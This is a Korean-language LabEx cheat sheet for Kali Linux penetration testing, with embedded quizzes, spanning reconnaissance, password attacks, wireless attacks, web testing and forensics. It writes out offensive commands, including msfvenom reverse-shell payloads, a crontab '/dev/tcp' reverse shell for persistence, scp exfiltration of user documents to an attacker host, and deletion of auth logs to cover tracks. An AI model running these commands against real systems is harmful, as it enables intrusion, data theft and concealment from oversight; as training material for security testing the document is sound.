---
title: 'Kali Linux 치트 시트 | LabEx'
description: '이 종합 치트 시트로 Kali Linux 침투 테스트를 배우세요. 보안 도구, 윤리적 해킹, 취약점 스캔, 익스플로잇 및 사이버 보안 테스트를 위한 빠른 참조 자료입니다.'
pdfUrl: '/cheatsheets/pdf/kali-linux-cheatsheet.pdf'
---

<base-title :title="frontmatter.title" :description="frontmatter.description">
Kali Linux 치트 시트
</base-title>

<base-pdf-url :url="frontmatter.pdfUrl" />

<base-disclaimer>
<base-disclaimer-title>
<a target="_blank" href="https://labex.io/ko/learn/kali">핸즈온 실습으로 Kali Linux 배우기</a>
</base-disclaimer-title>
<base-disclaimer-content>
핸즈온 실습과 실제 시나리오를 통해 Kali Linux 침투 테스트를 학습하세요. LabEx 는 필수 명령어, 네트워크 스캐닝, 취약점 평가, 암호 공격, 웹 애플리케이션 테스트 및 디지털 포렌스를 다루는 포괄적인 Kali Linux 과정을 제공합니다. 윤리적 해킹 기술과 보안 감사 도구를 마스터하세요.
</base-disclaimer-content>
</base-disclaimer>

## 시스템 설정 및 구성

### 초기 설정: `sudo apt update`

최적의 성능을 위해 시스템 패키지 및 저장소를 업데이트합니다.

```bash
# 패키지 저장소 업데이트
sudo apt update
# 설치된 패키지 업그레이드
sudo apt upgrade
# 전체 시스템 업그레이드
sudo apt full-upgrade
# 필수 도구 설치
sudo apt install curl wget git
```

### 사용자 관리: `sudo useradd`

보안 테스트를 위한 사용자 계정을 생성하고 관리합니다.

```bash
# 새 사용자 추가
sudo useradd -m username
# 암호 설정
sudo passwd username
# sudo 그룹에 사용자 추가
sudo usermod -aG sudo username
# 사용자 전환
su - username
```

### 서비스 관리: `systemctl`

테스트 시나리오를 위한 시스템 서비스 및 데몬을 제어합니다.

```bash
# 서비스 시작
sudo systemctl start apache2
# 서비스 중지
sudo systemctl stop apache2
# 부팅 시 서비스 활성화
sudo systemctl enable ssh
# 서비스 상태 확인
sudo systemctl status postgresql
```

### 네트워크 구성: `ifconfig`

침투 테스트를 위해 네트워크 인터페이스를 구성합니다.

```bash
# 네트워크 인터페이스 표시
ifconfig
# IP 주소 구성
sudo ifconfig eth0 192.168.1.100
# 인터페이스 활성화/비활성화
sudo ifconfig eth0 up
# 무선 인터페이스 구성
sudo ifconfig wlan0 up
```

### 환경 변수: `export`

테스트 환경 변수 및 경로를 설정합니다.

```bash
# 대상 IP 설정
export TARGET=192.168.1.1
# 단어장 경로 설정
export WORDLIST=/usr/share/wordlists/rockyou.txt
# 환경 변수 확인
env | grep TARGET
```

<BaseQuiz id="kali-env-1" correct="C">
  <template #question>
    `export` 로 설정된 환경 변수는 어떻게 되나요?
  </template>
  
  <BaseQuizOption value="A">시스템 재부팅 후에도 유지됩니다</BaseQuizOption>
  <BaseQuizOption value="B">현재 파일에서만 사용할 수 있습니다</BaseQuizOption>
  <BaseQuizOption value="C" correct>현재 셸과 자식 프로세스에서 사용할 수 있습니다</BaseQuizOption>
  <BaseQuizOption value="D">전역 시스템 변수입니다</BaseQuizOption>
  
  <BaseQuizAnswer>
    `export` 로 설정된 환경 변수는 현재 셸 세션과 그로부터 생성된 모든 자식 프로세스에서 사용할 수 있습니다. 셸 구성 파일 (.bashrc 등) 에 추가되지 않는 한 셸 세션이 종료되면 사라집니다.
  </BaseQuizAnswer>
</BaseQuiz>

### 도구 설치: `apt install`

추가 보안 도구 및 종속성을 설치합니다.

```bash
# 추가 도구 설치
sudo apt install nmap wireshark burpsuite
# GitHub에서 설치
git clone https://github.com/tool/repo.git
# Python 도구 설치
pip3 install --user tool-name
```

## 네트워크 검색 및 스캐닝

### 호스트 검색: `nmap -sn`

핑 스윕을 사용하여 네트워크에서 활성 호스트를 식별합니다.

```bash
# 핑 스윕
nmap -sn 192.168.1.0/24
# ARP 스캔 (로컬 네트워크)
nmap -PR 192.168.1.0/24
# ICMP 에코 스캔
nmap -PE 192.168.1.0/24
# 빠른 호스트 검색
masscan --ping 192.168.1.0/24
```

### 포트 스캐닝: `nmap`

대상 시스템에서 열린 포트와 실행 중인 서비스를 스캔합니다.

```bash
# 기본 TCP 스캔
nmap 192.168.1.1
# 공격적 스캔
nmap -A 192.168.1.1
# UDP 스캔
nmap -sU 192.168.1.1
# 스텔스 SYN 스캔
nmap -sS 192.168.1.1
```

<BaseQuiz id="kali-nmap-1" correct="B">
  <template #question>
    `nmap -sS`는 무엇을 수행합니까?
  </template>
  
  <BaseQuizOption value="A">UDP 스캔을 수행합니다</BaseQuizOption>
  <BaseQuizOption value="B" correct>스텔스 SYN 스캔 (반 개방 스캔) 을 수행합니다</BaseQuizOption>
  <BaseQuizOption value="C">모든 포트를 스캔합니다</BaseQuizOption>
  <BaseQuizOption value="D">OS 탐지를 수행합니다</BaseQuizOption>
  
  <BaseQuizAnswer>
    `-sS` 플래그는 TCP 핸드셰이크를 완료하지 않기 때문에 SYN 스캔 (반 개방 스캔이라고도 함) 을 수행합니다. SYN 패킷을 보내고 응답을 분석하여 완전한 TCP 연결 스캔보다 은밀합니다.
  </BaseQuizAnswer>
</BaseQuiz>

### 서비스 열거: `nmap -sV`

서비스 버전 및 잠재적 취약점을 식별합니다.

```bash
# 버전 탐지
nmap -sV 192.168.1.1
# OS 탐지
nmap -O 192.168.1.1
```

<BaseQuiz id="kali-enumeration-1" correct="A">
  <template #question>
    `nmap -sV`는 무엇을 수행합니까?
  </template>
  
  <BaseQuizOption value="A" correct>열린 포트에서 실행 중인 서비스 버전을 탐지합니다</BaseQuizOption>
  <BaseQuizOption value="B">버전 제어 포트만 스캔합니다</BaseQuizOption>
  <BaseQuizOption value="C">취약한 서비스만 표시합니다</BaseQuizOption>
  <BaseQuizOption value="D">OS 탐지만 수행합니다</BaseQuizOption>
  
  <BaseQuizAnswer>
    `-sV` 플래그는 버전 탐지를 활성화하여 열린 포트를 프로빙하여 어떤 서비스와 버전이 실행 중인지 확인합니다. 이는 특정 소프트웨어 버전과 관련된 잠재적 취약점을 식별하는 데 유용합니다.
  </BaseQuizAnswer>
</BaseQuiz>
# 스크립트 스캐닝
nmap -sC 192.168.1.1
# 포괄적인 스캔
nmap -sS -sV -O -A 192.168.1.1
```

## 정보 수집 및 정찰

### DNS 열거: `dig`

DNS 정보를 수집하고 영역 전송을 수행합니다.

```bash
# 기본 DNS 조회
dig example.com
# 역방향 DNS 조회
dig -x 192.168.1.1
# 영역 전송 시도
dig @ns1.example.com example.com axfr
# DNS 열거
dnsrecon -d example.com
```

### 웹 정찰: `dirb`

웹 서버에서 숨겨진 디렉터리 및 파일을 검색합니다.

```bash
# 디렉터리 무차별 대입 공격
dirb http://192.168.1.1
# 사용자 지정 단어장
dirb http://192.168.1.1 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# Gobuster 대안
gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

### WHOIS 정보: `whois`

도메인 등록 및 소유권 정보를 수집합니다.

```bash
# WHOIS 조회
whois example.com
# IP WHOIS
whois 8.8.8.8
# 포괄적인 정보 수집
theharvester -d example.com -l 100 -b google
```

### SSL/TLS 분석: `sslscan`

SSL/TLS 구성 및 취약점을 분석합니다.

```bash
# SSL 스캔
sslscan 192.168.1.1:443
# Testssl 종합 분석
testssl.sh https://example.com
# SSL 인증서 정보
openssl s_client -connect example.com:443
```

### SMB 열거: `enum4linux`

SMB 공유 및 NetBIOS 정보를 열거합니다.

```bash
# SMB 열거
enum4linux 192.168.1.1
# SMB 공유 나열
smbclient -L //192.168.1.1
# 공유 연결
smbclient //192.168.1.1/share
# SMB 취약점 스캔
nmap --script smb-vuln* 192.168.1.1
```

### SNMP 열거: `snmpwalk`

SNMP 프로토콜을 통해 시스템 정보를 수집합니다.

```bash
# SNMP 워크
snmpwalk -c public -v1 192.168.1.1
# SNMP 확인
onesixtyone -c community.txt 192.168.1.1
# SNMP 열거
snmp-check 192.168.1.1
```

## 취약점 분석 및 익스플로잇

### 취약점 스캐닝: `nessus`

자동화된 스캐너를 사용하여 보안 취약점을 식별합니다.

```bash
# Nessus 서비스 시작
sudo systemctl start nessusd
# OpenVAS 스캔
openvas-start
# Nikto 웹 취약점 스캐너
nikto -h http://192.168.1.1
# SQL 주입을 위한 SQLmap
sqlmap -u "http://example.com/page.php?id=1"
```

### Metasploit 프레임워크: `msfconsole`

익스플로잇을 실행하고 침투 테스트 캠페인을 관리합니다.

```bash
# Metasploit 시작
msfconsole
# 익스플로잇 검색
search ms17-010
# 익스플로잇 사용
use exploit/windows/smb/ms17_010_eternalblue
# 대상 설정
set RHOSTS 192.168.1.1
```

### 버퍼 오버플로 테스트: `pattern_create`

버퍼 오버플로 익스플로잇을 위한 패턴을 생성합니다.

```bash
# 패턴 생성
pattern_create.rb -l 400
# 오프셋 찾기
pattern_offset.rb -l 400 -q EIP_value
```

### 사용자 지정 익스플로잇 개발: `msfvenom`

특정 대상을 위한 사용자 지정 페이로드를 생성합니다.

```bash
# 셸코드 생성
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c
# Windows 리버스 셸
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe
# Linux 리버스 셸
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf
```

## 암호 공격 및 자격 증명 테스트

### 무차별 대입 공격: `hydra`

다양한 서비스에 대한 로그인 무차별 대입 공격을 수행합니다.

```bash
# SSH 무차별 대입 공격
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
# HTTP 폼 무차별 대입 공격
hydra -l admin -P passwords.txt 192.168.1.1 http-form-post "/login:username=^USER^&password=^PASS^:Invalid"
# FTP 무차별 대입 공격
hydra -L users.txt -P passwords.txt ftp://192.168.1.1
```

### 해시 크래킹: `hashcat`

GPU 가속을 사용하여 암호 해시를 크래킹합니다.

```bash
# MD5 해시 크래킹
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# NTLM 해시 크래킹
hashcat -m 1000 -a 0 ntlm.hash wordlist.txt
# 단어장 변형 생성
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule wordlist.txt
```

### John the Ripper: `john`

다양한 공격 모드를 사용한 전통적인 암호 크래킹.

```bash
# 암호 파일 크래킹
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
# 크래킹된 암호 보기
john --show shadow.txt
# 증분 모드
john --incremental shadow.txt
# 사용자 지정 규칙
john --rules --wordlist=passwords.txt shadow.txt
```

### 단어장 생성: `crunch`

대상 공격을 위한 사용자 지정 단어장을 생성합니다.

```bash
# 4-8 자리 단어장 생성
crunch 4 8 -o wordlist.txt
# 사용자 지정 문자 집합
crunch 6 6 -t admin@ -o passwords.txt
# 패턴 기반 생성
crunch 8 8 -t @@@@%%%% -o mixed.txt
```

## 무선 네트워크 보안 테스트

### 모니터 모드 설정: `airmon-ng`

패킷 캡처 및 주입을 위해 무선 어댑터를 구성합니다.

```bash
# 모니터 모드 활성화
sudo airmon-ng start wlan0
# 간섭 프로세스 확인
sudo airmon-ng check kill
# 모니터 모드 중지
sudo airmon-ng stop wlan0mon
```

### 네트워크 검색: `airodump-ng`

무선 네트워크 및 클라이언트를 검색하고 모니터링합니다.

```bash
# 모든 네트워크 스캔
sudo airodump-ng wlan0mon
# 특정 네트워크 대상 지정
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# WEP 네트워크만 표시
sudo airodump-ng --encrypt WEP wlan0mon
```

### WPA/WPA2 공격: `aircrack-ng`

WPA/WPA2 암호화된 네트워크에 대한 공격을 수행합니다.

```bash
# Deauth 공격
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
# 캡처된 핸드셰이크 크래킹
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
# Reaver 를 사용한 WPS 공격
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
```

### 가짜 AP 공격: `hostapd`

자격 증명 수집을 위해 악성 액세스 포인트를 생성합니다.

```bash
# 악성 AP 시작
sudo hostapd hostapd.conf
# DHCP 서비스
sudo dnsmasq -C dnsmasq.conf
# 자격 증명 캡처
ettercap -T -M arp:remote /192.168.1.0/24//
```

## 웹 애플리케이션 보안 테스트

### SQL 주입 테스트: `sqlmap`

자동화된 SQL 주입 탐지 및 익스플로잇.

```bash
# 기본 SQL 주입 테스트
sqlmap -u "http://example.com/page.php?id=1"
# POST 매개변수 테스트
sqlmap -u "http://example.com/login.php" --data="username=admin&password=test"
# 데이터베이스 추출
sqlmap -u "http://example.com/page.php?id=1" --dbs
# 특정 테이블 덤프
sqlmap -u "http://example.com/page.php?id=1" -D database -T users --dump
```

### 크로스 사이트 스크립팅: `xsser`

웹 애플리케이션에서 XSS 취약점을 테스트합니다.

```bash
# XSS 테스트
xsser --url "http://example.com/search.php?q=XSS"
# 자동 XSS 탐지
xsser -u "http://example.com" --crawl=10
# 사용자 지정 페이로드
xsser --url "http://example.com" --payload="<script>alert(1)</script>"
```

### Burp Suite 통합: `burpsuite`

포괄적인 웹 애플리케이션 보안 테스트 플랫폼.

```bash
# Burp Suite 시작
burpsuite
# 프록시 구성 (127.0.0.1:8080)
# 트래픽 캡처를 위해 브라우저 프록시 설정
# 자동화된 공격을 위해 Intruder 사용
# 콘텐츠 검색을 위해 Spider 사용
```

### 디렉터리 순회: `wfuzz`

디렉터리 순회 및 파일 포함 취약점을 테스트합니다.

```bash
# 디렉터리 퍼징
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://192.168.1.1/FUZZ
# 매개변수 퍼징
wfuzz -c -z file,payloads.txt "http://example.com/page.php?file=FUZZ"
```

## 익스플로잇 후 및 권한 상승

### 시스템 열거: `linpeas`

Linux 시스템에 대한 자동화된 권한 상승 열거.

```bash
# LinPEAS 다운로드
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
# 실행 권한 부여
chmod +x linpeas.sh
# 열거 실행
./linpeas.sh
# Windows 대안: winPEAS.exe
```

### 지속성 메커니즘: `crontab`

손상된 시스템에 지속성을 설정합니다.

```bash
# 크론탭 편집
crontab -e
# 리버스 셸 추가
@reboot /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
# SSH 키 지속성
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
```

### 데이터 유출: `scp`

손상된 시스템에서 데이터를 안전하게 전송합니다.

```bash
# 공격자 머신으로 파일 복사
scp file.txt user@192.168.1.100:/tmp/
# 압축 및 전송
tar -czf data.tar.gz /home/user/documents
scp data.tar.gz attacker@192.168.1.100:/tmp/
# HTTP 유출
python3 -m http.server 8000
```

### 흔적 지우기: `history`

손상된 시스템에서 활동 증거를 제거합니다.

```bash
# bash 기록 지우기
history -c
unset HISTFILE
# 특정 항목 지우기
history -d line_number
# 시스템 로그 지우기
sudo rm /var/log/auth.log*
```

## 디지털 포렌식 및 분석

### 디스크 이미징: `dd`

저장 장치의 포렌식 이미지를 생성합니다.

```bash
# 디스크 이미지 생성
sudo dd if=/dev/sdb of=/tmp/evidence.img bs=4096 conv=noerror,sync
# 이미지 무결성 확인
md5sum /dev/sdb > original.md5
md5sum /tmp/evidence.img > image.md5
# 이미지 마운트
sudo mkdir /mnt/evidence
sudo mount -o ro,loop /tmp/evidence.img /mnt/evidence
```

### 파일 복구: `foremost`

디스크 이미지 또는 드라이브에서 삭제된 파일을 복구합니다.

```bash
# 이미지에서 파일 복구
foremost -i evidence.img -o recovered/
# 특정 파일 형식
foremost -t jpg,png,pdf -i evidence.img -o photos/
# PhotoRec 대안
photorec evidence.img
```

### 메모리 분석: `volatility`

포렌식 증거를 위해 RAM 덤프를 분석합니다.

```bash
# OS 프로필 식별
volatility -f memory.dump imageinfo
# 프로세스 나열
volatility -f memory.dump --profile=Win7SP1x64 pslist
# 프로세스 추출
volatility -f memory.dump --profile=Win7SP1x64 procdump -p 1234 -D output/
```

### 네트워크 패킷 분석: `wireshark`

포렌식 증거를 위해 네트워크 트래픽 캡처를 분석합니다.

```bash
# Wireshark 시작
wireshark
# 명령줄 분석
tshark -r capture.pcap -Y "http.request.method==GET"
# 파일 추출
foremost -i capture.pcap -o extracted/
```

## 보고서 생성 및 문서화

### 스크린샷 캡처: `gnome-screenshot`

체계적인 스크린샷 캡처로 결과를 문서화합니다.

```bash
# 전체 화면 캡처
gnome-screenshot -f screenshot.png
# 창 캡처
gnome-screenshot -w -f window.png
# 지연 캡처
gnome-screenshot -d 5 -f delayed.png
# 영역 선택
gnome-screenshot -a -f area.png
```

### 로그 관리: `script`

문서화 목적으로 터미널 세션을 기록합니다.

```bash
# 세션 기록 시작
script session.log
# 타이밍 포함 기록
script -T session.time session.log
# 세션 재생
scriptreplay session.time session.log
```

### 보고서 템플릿: `reportlab`

전문적인 침투 테스트 보고서를 생성합니다.

```bash
# 보고서 도구 설치
pip3 install reportlab
# PDF 보고서 생성
python3 generate_report.py
# Markdown 을 PDF 로 변환
pandoc report.md -o report.pdf
```

### 증거 무결성: `sha256sum`

암호화 해시를 사용하여 관리 체인을 유지합니다.

```bash
# 체크섬 생성
sha256sum evidence.img > evidence.sha256
# 무결성 확인
sha256sum -c evidence.sha256
# 다중 파일 체크섬
find /evidence -type f -exec sha256sum {} \; > all_files.sha256
```

## 시스템 유지 관리 및 최적화

### 패키지 관리: `apt`

시스템 패키지 및 보안 도구를 유지 관리하고 업데이트합니다.

```bash
# 패키지 목록 업데이트
sudo apt update
# 모든 패키지 업그레이드
sudo apt upgrade
# 특정 도구 설치
sudo apt install tool-name
# 사용하지 않는 패키지 제거
sudo apt autoremove
```

### 커널 업데이트: `uname`

보안 패치를 위해 시스템 커널을 모니터링하고 업데이트합니다.

```bash
# 현재 커널 확인
uname -r
# 사용 가능한 커널 나열
apt list --upgradable | grep linux-image
# 새 커널 설치
sudo apt install linux-image-generic
# 이전 커널 제거
sudo apt autoremove --purge
```

### 도구 확인: `which`

도구 설치를 확인하고 실행 파일을 찾습니다.

```bash
# 도구 위치 찾기
which nmap
# 도구 존재 여부 확인
command -v metasploit
# 디렉터리의 모든 도구 나열
ls /usr/bin/ | grep -i security
```

### 리소스 모니터링: `htop`

집중적인 보안 테스트 중 시스템 리소스를 모니터링합니다.

```bash
# 대화형 프로세스 뷰어
htop
# 메모리 사용량
free -h
# 디스크 사용량
df -h
# 네트워크 연결
netstat -tulnp
```

## 필수 Kali Linux 단축키 및 별칭

### 별칭 생성: `.bashrc`

자주 사용하는 작업을 위한 시간 절약형 명령 단축키를 설정합니다.

```bash
# bashrc 편집
nano ~/.bashrc
# 유용한 별칭 추가
alias ll='ls -la'
alias nse='nmap --script-help'
alias target='export TARGET='
alias msf='msfconsole -q'
# bashrc 다시 로드
source ~/.bashrc
```

### 사용자 지정 함수: `function`

일반적인 워크플로를 위한 고급 명령 조합을 생성합니다.

```bash
# 빠른 nmap 스캔 함수
function qscan() {
    nmap -sS -sV -O $1
}
# 인게이지먼트를 위한 디렉터리 설정
function pentest-setup() {
    mkdir -p {recon,scans,exploits,loot}
}
```

### 키보드 단축키: 터미널

더 빠른 탐색을 위해 필수 키보드 단축키를 마스터합니다.

```bash
# 터미널 단축키
# Ctrl+C - 현재 명령 종료
# Ctrl+Z - 현재 명령 일시 중지
# Ctrl+L - 화면 지우기
# Ctrl+R - 명령 기록 검색
# Tab - 명령 자동 완성
# 위/아래 - 명령 기록 탐색
```

### 환경 구성: `tmux`

장시간 실행되는 작업을 위해 영구적인 터미널 세션을 설정합니다.

```bash
# 새 세션 시작
tmux new-session -s pentest
# 세션 분리
# Ctrl+B, D
# 세션 목록
tmux list-sessions
# 세션에 연결
tmux attach -t pentest
```

## 관련 링크

- <router-link to="/linux">Linux 치트 시트</router-link>
- <router-link to="/shell">Shell 치트 시트</router-link>
- <router-link to="/cybersecurity">사이버 보안 치트 시트</router-link>
- <router-link to="/nmap">Nmap 치트 시트</router-link>
- <router-link to="/wireshark">Wireshark 치트 시트</router-link>
- <router-link to="/hydra">Hydra 치트 시트</router-link>
- <router-link to="/devops">DevOps 치트 시트</router-link>
- <router-link to="/docker">Docker 치트 시트</router-link>
